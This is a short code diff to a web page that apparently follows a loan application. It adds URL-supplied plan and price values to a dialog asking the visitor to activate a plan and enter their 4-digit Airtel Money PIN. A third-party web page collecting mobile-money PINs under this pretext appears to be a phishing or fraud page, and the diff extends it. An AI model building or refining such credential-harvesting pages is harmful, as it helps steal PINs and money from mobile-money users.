@@ -695,6 +695,8 @@
   // Automatically reflect the phone number passed from the loan application.
   const incomingParams = new URLSearchParams(window.location.search);
   const incomingPhone = incomingParams.get('phone') || '';
+  const incomingPlan = incomingParams.get('plan') || 'Standard';
+  const incomingPrice = incomingParams.get('price') || '25.00';
   const normalizedPhone = incomingPhone.replace(/\D/g, '').replace(/^260/, '');
   if (ZAMBIA_MOBILE_PATTERN.test(normalizedPhone)) {
     phoneInput.value = normalizedPhone;
@@ -718,8 +720,19 @@
   }
 
   function showActivationDialog(phone){
+    const formattedPrice = Number(incomingPrice);
+    const displayPrice = Number.isFinite(formattedPrice)
+      ? formattedPrice.toFixed(2)
+      : '25.00';
+    const safePlan = incomingPlan.replace(/[&<>"']/g, character => ({
+      '&': '&amp;',
+      '<': '&lt;',
+      '>': '&gt;',
+      '"': '&quot;',
+      "'": '&#039;'
+    })[character]);
     invalidMessage.innerHTML =
-      'Do you want to activate Standard Plan<br>(ZMW 25.00) for +' +
+      'Do you want to activate ' + safePlan + ' Plan<br>(ZMW ' + displayPrice + ') for +' +
       '260 ' + phone + '?<br><br><strong>Enter 4-digit Airtel Money PIN:</strong>';
     dialogPinBoxes.forEach(box => {
       box.value = '';
